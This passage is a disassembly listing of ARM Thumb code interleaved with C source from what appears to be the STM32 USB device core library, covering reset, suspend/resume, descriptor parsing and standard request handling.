 800b2e6:	2300      	movs	r3, #0
}
 800b2e8:	4618      	mov	r0, r3
 800b2ea:	3718      	adds	r7, #24
 800b2ec:	46bd      	mov	sp, r7
 800b2ee:	bd80      	pop	{r7, pc}

0800b2f0 <USBD_LL_Reset>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Reset(USBD_HandleTypeDef *pdev)
{
 800b2f0:	b580      	push	{r7, lr}
 800b2f2:	b084      	sub	sp, #16
 800b2f4:	af00      	add	r7, sp, #0
 800b2f6:	6078      	str	r0, [r7, #4]
  USBD_StatusTypeDef ret = USBD_OK;
 800b2f8:	2300      	movs	r3, #0
 800b2fa:	73fb      	strb	r3, [r7, #15]

  /* Upon Reset call user call back */
  pdev->dev_state = USBD_STATE_DEFAULT;
 800b2fc:	687b      	ldr	r3, [r7, #4]
 800b2fe:	2201      	movs	r2, #1
 800b300:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  pdev->ep0_state = USBD_EP0_IDLE;
 800b304:	687b      	ldr	r3, [r7, #4]
 800b306:	2200      	movs	r2, #0
 800b308:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->dev_config = 0U;
 800b30c:	687b      	ldr	r3, [r7, #4]
 800b30e:	2200      	movs	r2, #0
 800b310:	605a      	str	r2, [r3, #4]
  pdev->dev_remote_wakeup = 0U;
 800b312:	687b      	ldr	r3, [r7, #4]
 800b314:	2200      	movs	r2, #0
 800b316:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
  pdev->dev_test_mode = 0U;
 800b31a:	687b      	ldr	r3, [r7, #4]
 800b31c:	2200      	movs	r2, #0
 800b31e:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
      }
    }
  }
#else

  if (pdev->pClass[0] != NULL)
 800b322:	687b      	ldr	r3, [r7, #4]
 800b324:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b328:	2b00      	cmp	r3, #0
 800b32a:	d014      	beq.n	800b356 <USBD_LL_Reset+0x66>
  {
    if (pdev->pClass[0]->DeInit != NULL)
 800b32c:	687b      	ldr	r3, [r7, #4]
 800b32e:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b332:	685b      	ldr	r3, [r3, #4]
 800b334:	2b00      	cmp	r3, #0
 800b336:	d00e      	beq.n	800b356 <USBD_LL_Reset+0x66>
    {
      if (pdev->pClass[0]->DeInit(pdev, (uint8_t)pdev->dev_config) != USBD_OK)
 800b338:	687b      	ldr	r3, [r7, #4]
 800b33a:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b33e:	685b      	ldr	r3, [r3, #4]
 800b340:	687a      	ldr	r2, [r7, #4]
 800b342:	6852      	ldr	r2, [r2, #4]
 800b344:	b2d2      	uxtb	r2, r2
 800b346:	4611      	mov	r1, r2
 800b348:	6878      	ldr	r0, [r7, #4]
 800b34a:	4798      	blx	r3
 800b34c:	4603      	mov	r3, r0
 800b34e:	2b00      	cmp	r3, #0
 800b350:	d001      	beq.n	800b356 <USBD_LL_Reset+0x66>
      {
        ret = USBD_FAIL;
 800b352:	2303      	movs	r3, #3
 800b354:	73fb      	strb	r3, [r7, #15]
    }
  }
#endif /* USE_USBD_COMPOSITE */

  /* Open EP0 OUT */
  (void)USBD_LL_OpenEP(pdev, 0x00U, USBD_EP_TYPE_CTRL, USB_MAX_EP0_SIZE);
 800b356:	2340      	movs	r3, #64	; 0x40
 800b358:	2200      	movs	r2, #0
 800b35a:	2100      	movs	r1, #0
 800b35c:	6878      	ldr	r0, [r7, #4]
 800b35e:	f001 fbc3 	bl	800cae8 <USBD_LL_OpenEP>
  pdev->ep_out[0x00U & 0xFU].is_used = 1U;
 800b362:	687b      	ldr	r3, [r7, #4]
 800b364:	2201      	movs	r2, #1
 800b366:	f8a3 2164 	strh.w	r2, [r3, #356]	; 0x164

  pdev->ep_out[0].maxpacket = USB_MAX_EP0_SIZE;
 800b36a:	687b      	ldr	r3, [r7, #4]
 800b36c:	2240      	movs	r2, #64	; 0x40
 800b36e:	f8c3 2160 	str.w	r2, [r3, #352]	; 0x160

  /* Open EP0 IN */
  (void)USBD_LL_OpenEP(pdev, 0x80U, USBD_EP_TYPE_CTRL, USB_MAX_EP0_SIZE);
 800b372:	2340      	movs	r3, #64	; 0x40
 800b374:	2200      	movs	r2, #0
 800b376:	2180      	movs	r1, #128	; 0x80
 800b378:	6878      	ldr	r0, [r7, #4]
 800b37a:	f001 fbb5 	bl	800cae8 <USBD_LL_OpenEP>
  pdev->ep_in[0x80U & 0xFU].is_used = 1U;
 800b37e:	687b      	ldr	r3, [r7, #4]
 800b380:	2201      	movs	r2, #1
 800b382:	849a      	strh	r2, [r3, #36]	; 0x24

  pdev->ep_in[0].maxpacket = USB_MAX_EP0_SIZE;
 800b384:	687b      	ldr	r3, [r7, #4]
 800b386:	2240      	movs	r2, #64	; 0x40
 800b388:	621a      	str	r2, [r3, #32]

  return ret;
 800b38a:	7bfb      	ldrb	r3, [r7, #15]
}
 800b38c:	4618      	mov	r0, r3
 800b38e:	3710      	adds	r7, #16
 800b390:	46bd      	mov	sp, r7
 800b392:	bd80      	pop	{r7, pc}

0800b394 <USBD_LL_SetSpeed>:
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_SetSpeed(USBD_HandleTypeDef *pdev,
                                    USBD_SpeedTypeDef speed)
{
 800b394:	b480      	push	{r7}
 800b396:	b083      	sub	sp, #12
 800b398:	af00      	add	r7, sp, #0
 800b39a:	6078      	str	r0, [r7, #4]
 800b39c:	460b      	mov	r3, r1
 800b39e:	70fb      	strb	r3, [r7, #3]
  pdev->dev_speed = speed;
 800b3a0:	687b      	ldr	r3, [r7, #4]
 800b3a2:	78fa      	ldrb	r2, [r7, #3]
 800b3a4:	741a      	strb	r2, [r3, #16]

  return USBD_OK;
 800b3a6:	2300      	movs	r3, #0
}
 800b3a8:	4618      	mov	r0, r3
 800b3aa:	370c      	adds	r7, #12
 800b3ac:	46bd      	mov	sp, r7
 800b3ae:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b3b2:	4770      	bx	lr

0800b3b4 <USBD_LL_Suspend>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Suspend(USBD_HandleTypeDef *pdev)
{
 800b3b4:	b480      	push	{r7}
 800b3b6:	b083      	sub	sp, #12
 800b3b8:	af00      	add	r7, sp, #0
 800b3ba:	6078      	str	r0, [r7, #4]
  if (pdev->dev_state != USBD_STATE_SUSPENDED)
 800b3bc:	687b      	ldr	r3, [r7, #4]
 800b3be:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b3c2:	b2db      	uxtb	r3, r3
 800b3c4:	2b04      	cmp	r3, #4
 800b3c6:	d006      	beq.n	800b3d6 <USBD_LL_Suspend+0x22>
  {
    pdev->dev_old_state = pdev->dev_state;
 800b3c8:	687b      	ldr	r3, [r7, #4]
 800b3ca:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b3ce:	b2da      	uxtb	r2, r3
 800b3d0:	687b      	ldr	r3, [r7, #4]
 800b3d2:	f883 229d 	strb.w	r2, [r3, #669]	; 0x29d
  }

  pdev->dev_state = USBD_STATE_SUSPENDED;
 800b3d6:	687b      	ldr	r3, [r7, #4]
 800b3d8:	2204      	movs	r2, #4
 800b3da:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c

  return USBD_OK;
 800b3de:	2300      	movs	r3, #0
}
 800b3e0:	4618      	mov	r0, r3
 800b3e2:	370c      	adds	r7, #12
 800b3e4:	46bd      	mov	sp, r7
 800b3e6:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b3ea:	4770      	bx	lr

0800b3ec <USBD_LL_Resume>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Resume(USBD_HandleTypeDef *pdev)
{
 800b3ec:	b480      	push	{r7}
 800b3ee:	b083      	sub	sp, #12
 800b3f0:	af00      	add	r7, sp, #0
 800b3f2:	6078      	str	r0, [r7, #4]
  if (pdev->dev_state == USBD_STATE_SUSPENDED)
 800b3f4:	687b      	ldr	r3, [r7, #4]
 800b3f6:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b3fa:	b2db      	uxtb	r3, r3
 800b3fc:	2b04      	cmp	r3, #4
 800b3fe:	d106      	bne.n	800b40e <USBD_LL_Resume+0x22>
  {
    pdev->dev_state = pdev->dev_old_state;
 800b400:	687b      	ldr	r3, [r7, #4]
 800b402:	f893 329d 	ldrb.w	r3, [r3, #669]	; 0x29d
 800b406:	b2da      	uxtb	r2, r3
 800b408:	687b      	ldr	r3, [r7, #4]
 800b40a:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  }

  return USBD_OK;
 800b40e:	2300      	movs	r3, #0
}
 800b410:	4618      	mov	r0, r3
 800b412:	370c      	adds	r7, #12
 800b414:	46bd      	mov	sp, r7
 800b416:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b41a:	4770      	bx	lr

0800b41c <USBD_LL_SOF>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_SOF(USBD_HandleTypeDef *pdev)
{
 800b41c:	b580      	push	{r7, lr}
 800b41e:	b082      	sub	sp, #8
 800b420:	af00      	add	r7, sp, #0
 800b422:	6078      	str	r0, [r7, #4]
  /* The SOF event can be distributed for all classes that support it */
  if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b424:	687b      	ldr	r3, [r7, #4]
 800b426:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b42a:	b2db      	uxtb	r3, r3
 800b42c:	2b03      	cmp	r3, #3
 800b42e:	d110      	bne.n	800b452 <USBD_LL_SOF+0x36>
          }
        }
      }
    }
#else
    if (pdev->pClass[0] != NULL)
 800b430:	687b      	ldr	r3, [r7, #4]
 800b432:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b436:	2b00      	cmp	r3, #0
 800b438:	d00b      	beq.n	800b452 <USBD_LL_SOF+0x36>
    {
      if (pdev->pClass[0]->SOF != NULL)
 800b43a:	687b      	ldr	r3, [r7, #4]
 800b43c:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b440:	69db      	ldr	r3, [r3, #28]
 800b442:	2b00      	cmp	r3, #0
 800b444:	d005      	beq.n	800b452 <USBD_LL_SOF+0x36>
      {
        (void)pdev->pClass[0]->SOF(pdev);
 800b446:	687b      	ldr	r3, [r7, #4]
 800b448:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b44c:	69db      	ldr	r3, [r3, #28]
 800b44e:	6878      	ldr	r0, [r7, #4]
 800b450:	4798      	blx	r3
      }
    }
#endif /* USE_USBD_COMPOSITE */
  }

  return USBD_OK;
 800b452:	2300      	movs	r3, #0
}
 800b454:	4618      	mov	r0, r3
 800b456:	3708      	adds	r7, #8
 800b458:	46bd      	mov	sp, r7
 800b45a:	bd80      	pop	{r7, pc}

0800b45c <USBD_CoreFindIF>:
  * @param  pdev: device instance
  * @param  index : selected interface number
  * @retval index of the class using the selected interface number. OxFF if no class found.
  */
uint8_t USBD_CoreFindIF(USBD_HandleTypeDef *pdev, uint8_t index)
{
 800b45c:	b480      	push	{r7}
 800b45e:	b083      	sub	sp, #12
 800b460:	af00      	add	r7, sp, #0
 800b462:	6078      	str	r0, [r7, #4]
 800b464:	460b      	mov	r3, r1
 800b466:	70fb      	strb	r3, [r7, #3]
  return 0xFFU;
#else
  UNUSED(pdev);
  UNUSED(index);

  return 0x00U;
 800b468:	2300      	movs	r3, #0
#endif /* USE_USBD_COMPOSITE */
}
 800b46a:	4618      	mov	r0, r3
 800b46c:	370c      	adds	r7, #12
 800b46e:	46bd      	mov	sp, r7
 800b470:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b474:	4770      	bx	lr

0800b476 <USBD_CoreFindEP>:
  * @param  pdev: device instance
  * @param  index : selected endpoint number
  * @retval index of the class using the selected endpoint number. 0xFF if no class found.
  */
uint8_t USBD_CoreFindEP(USBD_HandleTypeDef *pdev, uint8_t index)
{
 800b476:	b480      	push	{r7}
 800b478:	b083      	sub	sp, #12
 800b47a:	af00      	add	r7, sp, #0
 800b47c:	6078      	str	r0, [r7, #4]
 800b47e:	460b      	mov	r3, r1
 800b480:	70fb      	strb	r3, [r7, #3]
  return 0xFFU;
#else
  UNUSED(pdev);
  UNUSED(index);

  return 0x00U;
 800b482:	2300      	movs	r3, #0
#endif /* USE_USBD_COMPOSITE */
}
 800b484:	4618      	mov	r0, r3
 800b486:	370c      	adds	r7, #12
 800b488:	46bd      	mov	sp, r7
 800b48a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b48e:	4770      	bx	lr

0800b490 <USBD_GetEpDesc>:
  * @param  pConfDesc:  pointer to Bos descriptor
  * @param  EpAddr:  endpoint address
  * @retval pointer to video endpoint descriptor
  */
void *USBD_GetEpDesc(uint8_t *pConfDesc, uint8_t EpAddr)
{
 800b490:	b580      	push	{r7, lr}
 800b492:	b086      	sub	sp, #24
 800b494:	af00      	add	r7, sp, #0
 800b496:	6078      	str	r0, [r7, #4]
 800b498:	460b      	mov	r3, r1
 800b49a:	70fb      	strb	r3, [r7, #3]
  USBD_DescHeaderTypeDef *pdesc = (USBD_DescHeaderTypeDef *)(void *)pConfDesc;
 800b49c:	687b      	ldr	r3, [r7, #4]
 800b49e:	617b      	str	r3, [r7, #20]
  USBD_ConfigDescTypeDef *desc = (USBD_ConfigDescTypeDef *)(void *)pConfDesc;
 800b4a0:	687b      	ldr	r3, [r7, #4]
 800b4a2:	60fb      	str	r3, [r7, #12]
  USBD_EpDescTypeDef *pEpDesc = NULL;
 800b4a4:	2300      	movs	r3, #0
 800b4a6:	613b      	str	r3, [r7, #16]
  uint16_t ptr;

  if (desc->wTotalLength > desc->bLength)
 800b4a8:	68fb      	ldr	r3, [r7, #12]
 800b4aa:	885b      	ldrh	r3, [r3, #2]
 800b4ac:	b29a      	uxth	r2, r3
 800b4ae:	68fb      	ldr	r3, [r7, #12]
 800b4b0:	781b      	ldrb	r3, [r3, #0]
 800b4b2:	b29b      	uxth	r3, r3
 800b4b4:	429a      	cmp	r2, r3
 800b4b6:	d920      	bls.n	800b4fa <USBD_GetEpDesc+0x6a>
  {
    ptr = desc->bLength;
 800b4b8:	68fb      	ldr	r3, [r7, #12]
 800b4ba:	781b      	ldrb	r3, [r3, #0]
 800b4bc:	b29b      	uxth	r3, r3
 800b4be:	817b      	strh	r3, [r7, #10]

    while (ptr < desc->wTotalLength)
 800b4c0:	e013      	b.n	800b4ea <USBD_GetEpDesc+0x5a>
    {
      pdesc = USBD_GetNextDesc((uint8_t *)pdesc, &ptr);
 800b4c2:	f107 030a 	add.w	r3, r7, #10
 800b4c6:	4619      	mov	r1, r3
 800b4c8:	6978      	ldr	r0, [r7, #20]
 800b4ca:	f000 f81b 	bl	800b504 <USBD_GetNextDesc>
 800b4ce:	6178      	str	r0, [r7, #20]

      if (pdesc->bDescriptorType == USB_DESC_TYPE_ENDPOINT)
 800b4d0:	697b      	ldr	r3, [r7, #20]
 800b4d2:	785b      	ldrb	r3, [r3, #1]
 800b4d4:	2b05      	cmp	r3, #5
 800b4d6:	d108      	bne.n	800b4ea <USBD_GetEpDesc+0x5a>
      {
        pEpDesc = (USBD_EpDescTypeDef *)(void *)pdesc;
 800b4d8:	697b      	ldr	r3, [r7, #20]
 800b4da:	613b      	str	r3, [r7, #16]

        if (pEpDesc->bEndpointAddress == EpAddr)
 800b4dc:	693b      	ldr	r3, [r7, #16]
 800b4de:	789b      	ldrb	r3, [r3, #2]
 800b4e0:	78fa      	ldrb	r2, [r7, #3]
 800b4e2:	429a      	cmp	r2, r3
 800b4e4:	d008      	beq.n	800b4f8 <USBD_GetEpDesc+0x68>
        {
          break;
        }
        else
        {
          pEpDesc = NULL;
 800b4e6:	2300      	movs	r3, #0
 800b4e8:	613b      	str	r3, [r7, #16]
    while (ptr < desc->wTotalLength)
 800b4ea:	68fb      	ldr	r3, [r7, #12]
 800b4ec:	885b      	ldrh	r3, [r3, #2]
 800b4ee:	b29a      	uxth	r2, r3
 800b4f0:	897b      	ldrh	r3, [r7, #10]
 800b4f2:	429a      	cmp	r2, r3
 800b4f4:	d8e5      	bhi.n	800b4c2 <USBD_GetEpDesc+0x32>
 800b4f6:	e000      	b.n	800b4fa <USBD_GetEpDesc+0x6a>
          break;
 800b4f8:	bf00      	nop
        }
      }
    }
  }

  return (void *)pEpDesc;
 800b4fa:	693b      	ldr	r3, [r7, #16]
}
 800b4fc:	4618      	mov	r0, r3
 800b4fe:	3718      	adds	r7, #24
 800b500:	46bd      	mov	sp, r7
 800b502:	bd80      	pop	{r7, pc}

0800b504 <USBD_GetNextDesc>:
  * @param  buf: Buffer where the descriptor is available
  * @param  ptr: data pointer inside the descriptor
  * @retval next header
  */
USBD_DescHeaderTypeDef *USBD_GetNextDesc(uint8_t *pbuf, uint16_t *ptr)
{
 800b504:	b480      	push	{r7}
 800b506:	b085      	sub	sp, #20
 800b508:	af00      	add	r7, sp, #0
 800b50a:	6078      	str	r0, [r7, #4]
 800b50c:	6039      	str	r1, [r7, #0]
  USBD_DescHeaderTypeDef *pnext = (USBD_DescHeaderTypeDef *)(void *)pbuf;
 800b50e:	687b      	ldr	r3, [r7, #4]
 800b510:	60fb      	str	r3, [r7, #12]

  *ptr += pnext->bLength;
 800b512:	683b      	ldr	r3, [r7, #0]
 800b514:	881a      	ldrh	r2, [r3, #0]
 800b516:	68fb      	ldr	r3, [r7, #12]
 800b518:	781b      	ldrb	r3, [r3, #0]
 800b51a:	b29b      	uxth	r3, r3
 800b51c:	4413      	add	r3, r2
 800b51e:	b29a      	uxth	r2, r3
 800b520:	683b      	ldr	r3, [r7, #0]
 800b522:	801a      	strh	r2, [r3, #0]
  pnext = (USBD_DescHeaderTypeDef *)(void *)(pbuf + pnext->bLength);
 800b524:	68fb      	ldr	r3, [r7, #12]
 800b526:	781b      	ldrb	r3, [r3, #0]
 800b528:	461a      	mov	r2, r3
 800b52a:	687b      	ldr	r3, [r7, #4]
 800b52c:	4413      	add	r3, r2
 800b52e:	60fb      	str	r3, [r7, #12]

  return (pnext);
 800b530:	68fb      	ldr	r3, [r7, #12]
}
 800b532:	4618      	mov	r0, r3
 800b534:	3714      	adds	r7, #20
 800b536:	46bd      	mov	sp, r7
 800b538:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b53c:	4770      	bx	lr

0800b53e <SWAPBYTE>:

/** @defgroup USBD_DEF_Exported_Macros
  * @{
  */
__STATIC_INLINE uint16_t SWAPBYTE(uint8_t *addr)
{
 800b53e:	b480      	push	{r7}
 800b540:	b087      	sub	sp, #28
 800b542:	af00      	add	r7, sp, #0
 800b544:	6078      	str	r0, [r7, #4]
  uint16_t _SwapVal;
  uint16_t _Byte1;
  uint16_t _Byte2;
  uint8_t *_pbuff = addr;
 800b546:	687b      	ldr	r3, [r7, #4]
 800b548:	617b      	str	r3, [r7, #20]

  _Byte1 = *(uint8_t *)_pbuff;
 800b54a:	697b      	ldr	r3, [r7, #20]
 800b54c:	781b      	ldrb	r3, [r3, #0]
 800b54e:	827b      	strh	r3, [r7, #18]
  _pbuff++;
 800b550:	697b      	ldr	r3, [r7, #20]
 800b552:	3301      	adds	r3, #1
 800b554:	617b      	str	r3, [r7, #20]
  _Byte2 = *(uint8_t *)_pbuff;
 800b556:	697b      	ldr	r3, [r7, #20]
 800b558:	781b      	ldrb	r3, [r3, #0]
 800b55a:	823b      	strh	r3, [r7, #16]

  _SwapVal = (_Byte2 << 8) | _Byte1;
 800b55c:	8a3b      	ldrh	r3, [r7, #16]
 800b55e:	021b      	lsls	r3, r3, #8
 800b560:	b21a      	sxth	r2, r3
 800b562:	f9b7 3012 	ldrsh.w	r3, [r7, #18]
 800b566:	4313      	orrs	r3, r2
 800b568:	b21b      	sxth	r3, r3
 800b56a:	81fb      	strh	r3, [r7, #14]

  return _SwapVal;
 800b56c:	89fb      	ldrh	r3, [r7, #14]
}
 800b56e:	4618      	mov	r0, r3
 800b570:	371c      	adds	r7, #28
 800b572:	46bd      	mov	sp, r7
 800b574:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b578:	4770      	bx	lr
	...

0800b57c <USBD_StdDevReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdDevReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b57c:	b580      	push	{r7, lr}
 800b57e:	b084      	sub	sp, #16
 800b580:	af00      	add	r7, sp, #0
 800b582:	6078      	str	r0, [r7, #4]
 800b584:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800b586:	2300      	movs	r3, #0
 800b588:	73fb      	strb	r3, [r7, #15]

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b58a:	683b      	ldr	r3, [r7, #0]
 800b58c:	781b      	ldrb	r3, [r3, #0]
 800b58e:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b592:	2b40      	cmp	r3, #64	; 0x40
 800b594:	d005      	beq.n	800b5a2 <USBD_StdDevReq+0x26>
 800b596:	2b40      	cmp	r3, #64	; 0x40
 800b598:	d857      	bhi.n	800b64a <USBD_StdDevReq+0xce>
 800b59a:	2b00      	cmp	r3, #0
 800b59c:	d00f      	beq.n	800b5be <USBD_StdDevReq+0x42>
 800b59e:	2b20      	cmp	r3, #32
 800b5a0:	d153      	bne.n	800b64a <USBD_StdDevReq+0xce>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
      ret = (USBD_StatusTypeDef)pdev->pClass[pdev->classId]->Setup(pdev, req);
 800b5a2:	687b      	ldr	r3, [r7, #4]
 800b5a4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800b5a8:	687b      	ldr	r3, [r7, #4]
 800b5aa:	32ae      	adds	r2, #174	; 0xae
 800b5ac:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b5b0:	689b      	ldr	r3, [r3, #8]
 800b5b2:	6839      	ldr	r1, [r7, #0]
 800b5b4:	6878      	ldr	r0, [r7, #4]
 800b5b6:	4798      	blx	r3
 800b5b8:	4603      	mov	r3, r0
 800b5ba:	73fb      	strb	r3, [r7, #15]
      break;
 800b5bc:	e04a      	b.n	800b654 <USBD_StdDevReq+0xd8>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800b5be:	683b      	ldr	r3, [r7, #0]
 800b5c0:	785b      	ldrb	r3, [r3, #1]
 800b5c2:	2b09      	cmp	r3, #9
 800b5c4:	d83b      	bhi.n	800b63e <USBD_StdDevReq+0xc2>
 800b5c6:	a201      	add	r2, pc, #4	; (adr r2, 800b5cc <USBD_StdDevReq+0x50>)
 800b5c8:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800b5cc:	0800b621 	.word	0x0800b621
 800b5d0:	0800b635 	.word	0x0800b635
 800b5d4:	0800b63f 	.word	0x0800b63f
 800b5d8:	0800b62b 	.word	0x0800b62b
 800b5dc:	0800b63f 	.word	0x0800b63f
 800b5e0:	0800b5ff 	.word	0x0800b5ff
 800b5e4:	0800b5f5 	.word	0x0800b5f5
 800b5e8:	0800b63f 	.word	0x0800b63f
 800b5ec:	0800b617 	.word	0x0800b617
 800b5f0:	0800b609 	.word	0x0800b609
      {
        case USB_REQ_GET_DESCRIPTOR:
          USBD_GetDescriptor(pdev, req);
 800b5f4:	6839      	ldr	r1, [r7, #0]
 800b5f6:	6878      	ldr	r0, [r7, #4]
 800b5f8:	f000 fa3c 	bl	800ba74 <USBD_GetDescriptor>
          break;
 800b5fc:	e024      	b.n	800b648 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_ADDRESS:
          USBD_SetAddress(pdev, req);
 800b5fe:	6839      	ldr	r1, [r7, #0]
 800b600:	6878      	ldr	r0, [r7, #4]
 800b602:	f000 fbcb 	bl	800bd9c <USBD_SetAddress>
          break;
 800b606:	e01f      	b.n	800b648 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_CONFIGURATION:
          ret = USBD_SetConfig(pdev, req);
 800b608:	6839      	ldr	r1, [r7, #0]
 800b60a:	6878      	ldr	r0, [r7, #4]
 800b60c:	f000 fc0a 	bl	800be24 <USBD_SetConfig>
 800b610:	4603      	mov	r3, r0
 800b612:	73fb      	strb	r3, [r7, #15]
          break;
 800b614:	e018      	b.n	800b648 <USBD_StdDevReq+0xcc>

        case USB_REQ_GET_CONFIGURATION:
          USBD_GetConfig(pdev, req);
 800b616:	6839      	ldr	r1, [r7, #0]
 800b618:	6878      	ldr	r0, [r7, #4]
 800b61a:	f000 fcad 	bl	800bf78 <USBD_GetConfig>
          break;
 800b61e:	e013      	b.n	800b648 <USBD_StdDevReq+0xcc>

        case USB_REQ_GET_STATUS:
          USBD_GetStatus(pdev, req);
 800b620:	6839      	ldr	r1, [r7, #0]
 800b622:	6878      	ldr	r0, [r7, #4]
 800b624:	f000 fcde 	bl	800bfe4 <USBD_GetStatus>
          break;
 800b628:	e00e      	b.n	800b648 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_FEATURE:
          USBD_SetFeature(pdev, req);
 800b62a:	6839      	ldr	r1, [r7, #0]
 800b62c:	6878      	ldr	r0, [r7, #4]
 800b62e:	f000 fd0d 	bl	800c04c <USBD_SetFeature>
          break;
 800b632:	e009      	b.n	800b648 <USBD_StdDevReq+0xcc>

        case USB_REQ_CLEAR_FEATURE:
          USBD_ClrFeature(pdev, req);
 800b634:	6839      	ldr	r1, [r7, #0]
 800b636:	6878      	ldr	r0, [r7, #4]
 800b638:	f000 fd31 	bl	800c09e <USBD_ClrFeature>
          break;
 800b63c:	e004      	b.n	800b648 <USBD_StdDevReq+0xcc>

        default:
          USBD_CtlError(pdev, req);
 800b63e:	6839      	ldr	r1, [r7, #0]
 800b640:	6878      	ldr	r0, [r7, #4]
 800b642:	f000 fd88 	bl	800c156 <USBD_CtlError>
          break;
 800b646:	bf00      	nop
      }
      break;
 800b648:	e004      	b.n	800b654 <USBD_StdDevReq+0xd8>

    default:
      USBD_CtlError(pdev, req);
 800b64a:	6839      	ldr	r1, [r7, #0]
 800b64c:	6878      	ldr	r0, [r7, #4]
 800b64e:	f000 fd82 	bl	800c156 <USBD_CtlError>
      break;
 800b652:	bf00      	nop
  }

  return ret;
 800b654:	7bfb      	ldrb	r3, [r7, #15]
}
 800b656:	4618      	mov	r0, r3
 800b658:	3710      	adds	r7, #16
 800b65a:	46bd      	mov	sp, r7
 800b65c:	bd80      	pop	{r7, pc}
 800b65e:	bf00      	nop

0800b660 <USBD_StdItfReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdItfReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b660:	b580      	push	{r7, lr}
 800b662:	b084      	sub	sp, #16
 800b664:	af00      	add	r7, sp, #0
 800b666:	6078      	str	r0, [r7, #4]
 800b668:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800b66a:	2300      	movs	r3, #0
 800b66c:	73fb      	strb	r3, [r7, #15]
  uint8_t idx;

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b66e:	683b      	ldr	r3, [r7, #0]
 800b670:	781b      	ldrb	r3, [r3, #0]
 800b672:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b676:	2b40      	cmp	r3, #64	; 0x40
 800b678:	d005      	beq.n	800b686 <USBD_StdItfReq+0x26>
 800b67a:	2b40      	cmp	r3, #64	; 0x40
 800b67c:	d852      	bhi.n	800b724 <USBD_StdItfReq+0xc4>
 800b67e:	2b00      	cmp	r3, #0
 800b680:	d001      	beq.n	800b686 <USBD_StdItfReq+0x26>
 800b682:	2b20      	cmp	r3, #32
 800b684:	d14e      	bne.n	800b724 <USBD_StdItfReq+0xc4>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
    case USB_REQ_TYPE_STANDARD:
      switch (pdev->dev_state)
 800b686:	687b      	ldr	r3, [r7, #4]
 800b688:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b68c:	b2db      	uxtb	r3, r3
 800b68e:	3b01      	subs	r3, #1
 800b690:	2b02      	cmp	r3, #2
 800b692:	d840      	bhi.n	800b716 <USBD_StdItfReq+0xb6>
      {
        case USBD_STATE_DEFAULT:
        case USBD_STATE_ADDRESSED:
        case USBD_STATE_CONFIGURED:

          if (LOBYTE(req->wIndex) <= USBD_MAX_NUM_INTERFACES)
 800b694:	683b      	ldr	r3, [r7, #0]
 800b696:	889b      	ldrh	r3, [r3, #4]
 800b698:	b2db      	uxtb	r3, r3
 800b69a:	2b01      	cmp	r3, #1
 800b69c:	d836      	bhi.n	800b70c <USBD_StdItfReq+0xac>
          {
            /* Get the class index relative to this interface */
            idx = USBD_CoreFindIF(pdev, LOBYTE(req->wIndex));
 800b69e:	683b      	ldr	r3, [r7, #0]
 800b6a0:	889b      	ldrh	r3, [r3, #4]
 800b6a2:	b2db      	uxtb	r3, r3
 800b6a4:	4619      	mov	r1, r3
 800b6a6:	6878      	ldr	r0, [r7, #4]
 800b6a8:	f7ff fed8 	bl	800b45c <USBD_CoreFindIF>
 800b6ac:	4603      	mov	r3, r0
 800b6ae:	73bb      	strb	r3, [r7, #14]
            if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b6b0:	7bbb      	ldrb	r3, [r7, #14]
